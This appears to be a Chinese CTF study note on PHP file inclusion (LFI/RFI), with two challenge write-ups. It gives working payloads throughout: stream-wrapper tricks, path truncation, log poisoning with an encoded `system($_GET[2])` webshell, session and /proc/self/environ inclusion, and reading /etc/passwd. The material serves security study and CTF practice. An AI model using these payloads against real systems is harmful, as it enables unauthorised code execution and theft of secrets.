# 文件包含专题（LFI / RFI）

> **一句话:应用把用户的输入拼进了 `include`,于是你能让它加载任意文件 —— 包括你自己造的文件。**

---

## 一、先判断有没有这个点

### 四个函数

| 函数 | 失败时 | 特点 |
|---|---|---|
| `include` | **Warning**,继续执行 | 最常用 |
| `include_once` | 同上 | 只包含一次 |
| `require` | **Fatal**,中断 | |
| `require_once` | 同上 | |

### 有洞的样子

```php
include $_GET['page'];
include "pages/" . $_GET['p'] . ".php";
require $file;
```

**参数直接或间接进入 include → 就是洞。**

### 判断方法

```text
?page=about         → 正常
?page=nonexist      → 报错里有路径/文件名        ← 有戏
?page=/etc/passwd   → 内容是 passwd              ← 成了
```

**报错信息最值钱：**

```
Warning: include(nonexist.php): failed to open stream: No such file or directory
in /var/www/html/index.php on line 3
```

**→ 立刻知道：web 根是 `/var/www/html`，参数被直接拼进去了。**

## 二、LFI 和 RFI

| | 全称 | 条件 | 能做什么 |
|---|---|---|---|
| **LFI** | Local File Inclusion | 默认可用 | 读本机文件 |
| **RFI** | Remote File Inclusion | `allow_url_include=On`（默认 **Off**） | 包含远程服务器上的文件 → 直接 RCE |

**RFI 现在基本见不到（默认关了），CTF 里大多是 LFI + 伪协议。**

## 三、伪协议（最常用的一节）

### ① `php://filter` —— 读源码，不执行

```text
?file=php://filter/convert.base64-encode/resource=index.php
```

**为什么需要它：**

```text
include("index.php")        →  PHP 执行它,你只看到输出
include("php://filter/...") →  base64 编码后给你,不执行
```

**拿到 base64 自己解码，就能看到源码。**

**常用过滤器链：**

| 过滤器 | 作用 |
|---|---|
| `convert.base64-encode` | base64 编码（最常用） |
| `convert.base64-decode` | 解码 |
| `convert.iconv.UTF8.UTF7` | 绕过某些关键字过滤 |
| `string.strip_tags` | 去标签 |

### ② `php://input` —— 把请求体当文件

```text
?file=php://input        （POST body 里放 PHP 代码）
```

**前提：`allow_url_include=On`（有些题会开）。**

### ③ `data://` —— 把字面量当文件

```text
?file=data://text/plain,<?php system('id'); ?>
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+
```

**同样需要 `allow_url_include=On`。**

### ④ `phar://` —— 触发反序列化

```text
?file=phar://uploads/avatar.jpg/x
```

**前提：存在一个 phar 文件（通常靠上传得到），且代码里有可用的魔术方法。**

**注意：`phar://` 在读文件时就会触发**反序列化**，不需要真的包含到那个文件内容。**

### ⑤ `zip://`

```text
?file=zip://uploads/avatar.zip%23shell.php
```

**`%23` 是 `#`，后面是压缩包里的文件名。**

### ⑥ `file://`

```text
?file=file:///etc/passwd
```

**只是显式声明协议，和其他读法等价。**

### ⑦ `php://filter` 的写侧（`write=` 滤镜）⭐

**前面六个都是「读」，这个滤镜还能用在**写入**方向上 —— 当题目里有 `file_put_contents($file, $data)` 且 `$file` 可控时：**

```text
?filename=php://filter/write=convert.base64-decode/resource=shell.php
```

**`convert.base64-decode` 在**写入前**把数据解码：**

```text
规则: 只认 [A-Za-z0-9+/=]，其他字符全部丢弃；每 4 个字符 → 3 字节
```

**这招专治「前缀死刑」—— 比如服务端强制在你内容前面拼 `<?php exit;?>`：**

```text
写入的数据:  <?php exit;?>  +  你的内容
留下:        phpexit (7 个字母)  +  你的内容
解码后:      [6 字节乱码]  +  你的 PHP 代码
```

**乱码里没有 `<`，PHP 不会在那里进入代码模式 —— 前缀就被废掉了。**

**对齐规则（唯一要算的东西）：**

```text
7（phpexit 的字母数）+ 补充字符数 + base64 长度   必须 % 4 == 0

补 1 个 → 凑成 8      ✅
补 5 个 → 凑成 12     ✅
```

**`>`、`?`、`;` 这些字符全在字母表外，会被丢弃 —— 所以「前缀被删掉」是错觉，它是被**翻译成了 6 个乱码字节**。**

### 一张表记住

| 协议 | 能读源码 | 能 RCE | 前提 |
|---|---|---|---|
| `php://filter`（read） | ✅ | ❌ | 无 |
| `php://filter`（write） | ❌ | ✅ | 有写入点 + `$filename` 可控 |
| `php://input` | ❌ | ✅ | `allow_url_include=On` |
| `data://` | ❌ | ✅ | `allow_url_include=On` |
| `phar://` | 间接 | 间接 | 有 phar 文件 + 魔术方法 |
| `zip://` | ✅ | ✅ | 有压缩包 |

## 四、路径与截断的五个技巧

### ① `../` 跳目录

```text
?file=../../../../etc/passwd
```

**最基础，和路径遍历一样。**

### ② `?` 截断（WarmUp 用的）

**当代码是 `include $_GET['file'] . '.php'` 时：**

```text
?file=../../../../flag.php?
```

**后面拼的 `.php` 被 `?` 挡住。**（取决于 PHP 版本和路径处理）

### ③ `%00` 截断

```text
?file=../../../../flag.php%00
```

**只对 PHP < 5.3.4 有效。**

### ④ 长度截断

**老 PHP 有路径长度上限（4096 或 260），超长会被截断。**

### ⑤ `?/../` 词法折叠（WarmUp 的真正机制）⭐

**这是我实测出来的：**

```text
include("不存在的目录/../target.php")   →  能成功加载 target.php
include("sub/../target.php")            →  能成功
include("nonexist?/../target.php")      →  失败(Windows)
```

**结论：PHP 对 include 的路径做**词法折叠** —— `..` 把前一段抵掉，**不需要那一段真实存在**。**

**所以 WarmUp 的 payload：**

```text
?file=source.php?/../../../../ffffllllaaaagggg
       └────┬────┘ └──┬──┘
      校验时截断到这里   然后被 ../../ 一路上跳
```

**校验看的是 `?` 之前（`source.php`，在白名单里），include 用的是整串 —— 而 `source.php?` 这一段被后面的 `..` 抵掉了，根本不需要它存在。**

**⚠️ 这个"非法目录名 + `/..`"的技巧在 Windows 上不成立（`?` 是非法文件名字符），只在 Linux 上有效。**

## 五、从"读文件"到 RCE 的五条路

### ① 日志包含（最经典）⭐

**三个前提，缺一不可：**

```text
① 日志路径可读（www-data 有读权限）
② 日志内容可控（你的请求会被记进去）
③ 日志会被 include（= include 会解析其中的 PHP 标签）
```

**最省事的写法 —— 把 payload 放进路径，让 **error.log** 记下来：**

```text
GET /%3C%3Fphp%20system(%24_GET[2])%3B%3F%3E.php
                    └── URL 编码 ──┘      └ .php ┘

?file=/var/log/nginx/error.log&2=id
```

| 服务器 | access.log | error.log |
|---|---|---|
| Apache (Debian/Ubuntu) | `/var/log/apache2/access.log` | `/var/log/apache2/error.log` |
| Apache (CentOS) | `/var/log/httpd/access_log` | `/var/log/httpd/error_log` |
| Nginx | `/var/log/nginx/access.log` | `/var/log/nginx/error.log` |

**⚠️ 路径名不可信：实测遇到过「文件名写 nginx、内容是 Apache 的日志」（`[authz_core:error]` 是 Apache 模块）。看内容判断，别看路径。**

#### 为什么优先 error.log

```text
access.log  →  记录所有请求，动辄几 MB，混着扫描器和其他人的 payload
error.log   →  只记错误，通常几 KB，干净
```

**error.log 里那条 `script '...' not found or unable to stat` 是 mod_php 找不到脚本时写的 —— 只有路径**以 `.php` 结尾**才会产生（否则只进 access.log）。**

#### 写进去的四种姿势

| 位置 | 怎么触发 | 备注 |
|---|---|---|
| **URL 路径** | `GET /<编码后的PHP>.php` | 最稳，error.log 会原样记录 |
| User-Agent | UA 里放 PHP 代码 | 只进 access.log |
| Referer | 同上 | 只进 access.log |
| 无效请求行 | 畸形 HTTP | 依赖 error 级别配置 |

#### 三个硬性要求（错一个就白干）

```text
① URL 编码 < ? > 空格
   —— 不编码的话 ? 会被当成查询串起点，路径被截断

② 路径必须以 .php 结尾
   —— 否则不走 mod_php，error.log 里根本不会有这条

③ payload 必须带 ?>
   —— 不带的话，日志尾部的 ' not found... 会被当成 PHP 继续解析 → Parse error
```

#### 先确认、再执行

```text
确认（不执行）:  ?file=php://filter/convert.base64-encode/resource=/var/log/nginx/error.log
执行:            ?file=/var/log/nginx/error.log&2=id
```

**为什么要确认：**

```text
include 读日志   →  看到的是"执行后的残骸"（PHP 标签被吃掉，看起来像丢了一段）
php://filter 读  →  看到的是原始字节，才能核对 payload 是否完整
```

#### 日志注入的四个坑

**坑 1：一次写错，整份日志报废**

**只要日志里有一处 `<?` 后面跟着不合法的 PHP，include 时就是 Parse error → 500，直到日志被轮转。**

**坑 2：别人也会把日志写坏**

**共享实例上，别人的坏 payload 同样能毁掉你的路。**抢在别人前面注入**是这类题的真实竞争点。**

**坑 3：日志会被轮转**

**access.log 涨到一定体积会轮转，旧文件被改名、新文件权限可能变化 —— 之前能读，过一会儿就 0 字节了。注入完立刻用。**

**坑 4：别人的 payload 会先执行**

**如果日志里已有 `<?php eval($_GET['1']);?>`，你执行时**它先跑** —— `eval` 拿到非法 PHP 就致命错误，你的 payload 永远轮不到。**

**对策：换一个参数名（`$_GET[2]`），并且**不传**那个会触发别人 payload 的参数。**

### ② session 包含


```text
① 往 session 里写:  ?name=<?php system($_GET[0]); ?>
② 包含:  ?file=/tmp/sess_<PHPSESSID>
```

**session 文件路径：**

```text
/tmp/sess_<id>                    ← 默认
/var/lib/php/sessions/sess_<id>   ← Debian/Ubuntu 常见
```

### ③ `/proc/self/environ`

```text
User-Agent: <?php system($_GET[0]); ?>
?file=/proc/self/environ&0=id
```

**UA 会被写进进程环境变量。**（需要 PHP 有权限读）

### ④ 直接写、直接包含

```text
?file=php://input        POST: <?php system('id'); ?>
?file=data://text/plain,<?php system('id'); ?>
```

**最省事，但要 `allow_url_include=On`。**

### ⑤ 上传 + 包含

**传一个图片马（`.jpg` 里带 PHP），再 `include` 它。**

**这是"上传题"和"包含题"的交汇点 —— 上传题里绕过校验得到的文件，最后常常要靠包含来执行。**

## 七、实战记录

### 7.1 ✅ [HCTF 2018] WarmUp

**考点：白名单 + `?` 截断 + 路径词法折叠**

**源码核心：**

```php
class emmm {
    public static function checkFile(&$page) {
        $whitelist = ["source"=>"source.php", "hint"=>"hint.php"];
        if (in_array($page, $whitelist)) return true;                    // ① 原样
        $_page = mb_substr($page, 0, mb_strpos($page.'?','?'));          // ② 截到 ?
        if (in_array($_page, $whitelist)) return true;
        $_page = urldecode($page);                                       // ③ 解码后再截
        $_page = mb_substr($_page, 0, mb_strpos($_page.'?','?'));
        if (in_array($_page, $whitelist)) return true;
        return false;
    }
}
include $_REQUEST['file'];
```

**payload：**

```text
?file=source.php?/../../../../ffffllllaaaagggg
```

**`../` 数量一个一个往上加。**

**为什么能过：校验截到 `?` 只剩 `source.php`（白名单内），而 include 拿到整串，`source.php?` 被后面的 `..` 抵掉。**

→ 详见 WP：[/blog/hctf2018-warmup/](../../blog/posts/2026-10-24-hctf2018-warmup.md)

### 7.3 ✅ 碰星文件管理（ZeroG Stage 2）

**考点：文件包含 → 日志注入 → 环境变量取 flag**

**源码三个关键点：**

```php
$WAF_PATTERN = '/(flag|cat|ls|\*|\?)/i';    // 只作用于 cmd
if (isset($_GET['cmd'])) { ... }             // ← 陷阱：函数从未被调用

$file = str_replace('../', '', $file);       // 剥两次 → 相对穿越死
$file = str_replace('..',  '', $file);
if ($is_stream)             { $target = $file; }   // php:// 放行
elseif (file_exists($file)) { $target = $file; }   // 绝对路径放行
include($target);
```

**完整链路：**

```text
?file=php://filter/convert.base64-encode/resource=index.php   → 读源码
GET /%3C%3Fphp%20system(%24_GET[2])%3B%3F%3E.php              → 注入 error.log
?file=/var/log/nginx/error.log&2=ls -la /                     → RCE
cat /entrypoint.sh                                            → 发现 flag 来自环境变量
cat /proc/self/environ                                        → 拿 flag
```

**为什么 `/flag` 读不到：**

```
-r-------- 1 root root  flag     ← 400，www-data 读不了
```

**而 `entrypoint.sh` 里写着：**

```sh
export ZeroG_2026_FLAG="$FLAG_VALUE"
printf '%s\n' "$FLAG_VALUE" > /flag
chmod 400 /flag
exec apache2-foreground          # ← Apache 继承了环境变量
```

**flag 写进 `/flag` 的同时也被 export 给了 Apache —— 所以最短的路是 `/proc/self/environ`。**

→ 详见 WP：[/blog/pengxing-doc-lfi-log-poisoning/](../../blog/posts/2026-10-30-pengxing-doc-lfi.md)

## 八、我踩的坑

### 坑 1：以为 `include` 只认 `../` 路径

**`source.php?/../` 这种"非法目录名 + `/..`"也能过关 —— 因为 PHP 对路径做词法折叠，不检查中间段是否存在。**

### 坑 2：忘了校验和 include 用的不是同一个字符串

**WarmUp 里 `checkFile` 用 `$_page`（截断后的），`include` 用 `$_REQUEST['file']`（原始串）。**

**这类"校验与使用不一致"是所有绕过题的母题**，和路径遍历六关、上传题的三道防线是同一个模型。

### 坑 3：`php://filter` 拼错

```text
❌ php://filter/read=convert.base64encode/resource=index.php   （少个横杠）
✅ php://filter/read=convert.base64-encode/resource=index.php
```

**拼错不会报错，只会返回空 —— 很容易误判成"没这个文件"。**

### 坑 4：以为 `echo` 能打印数组

**和 RCE 专题里同一条：`echo` 数组只会输出 `Array`。**

### 坑 5：把「执行后的残骸」当成「被截断」

**include 日志后看到 `script '/var/www/html/.php'`，会以为 payload 被截断了 —— 其实中间那段 `<?php ... ?>` 是**被执行了**。**

```
文本:  script '/var/www/html/
代码:  <?php system($_GET[2]);?>      ← 执行，不产生输出
文本:  .php' not found
```

**判断方法：看这条日志有没有完整的时间戳前缀。有，就说明日志行是完整的，只是代码段被吃掉了。**

**取证必须用 `php://filter`（不执行），不能用 `include`。**

### 坑 6：日志写坏 = 整份作废

**一行 `<?php eval($_GET['1'];?>` （少一个右括号）就能让整份日志 Parse error → 之后每次 include 都是 500。**

**对策：**

```text
① 注入前先本地 php -l 或数括号
② 注入后先用 php://filter 读回来核对，再 include
③ 共享实例上要抢时间 —— 别人写坏之前用完
```

### 坑 7：`allow_url_include=Off` 时只有 filter 能用

**实测 `data://` 和 `php://input` 返回空（需要 `allow_url_include=On`），但 `php://filter` 正常。**

**判断方法：发 `?file=data://text/plain,HELLO`，有输出就是 On。**

## 九、一句话总结

> **文件包含 = 参数进了 `include`。**
>
> **读源码用 `php://filter/convert.base64-encode`；要执行用 `php://input` 或 `data://`；**
> **要 RCE 且协议被禁，就写日志 / 写 session / 传图片马，再包含它。**
>
> **绕过白名单的核心永远是：校验看的是 A 串，include 用的是 B 串 —— 找 A 和 B 的差。**
>
> **flag 读不到时，先看 `entrypoint.sh` 和 `/proc/self/environ` —— 它常常不在 flag 文件里。**
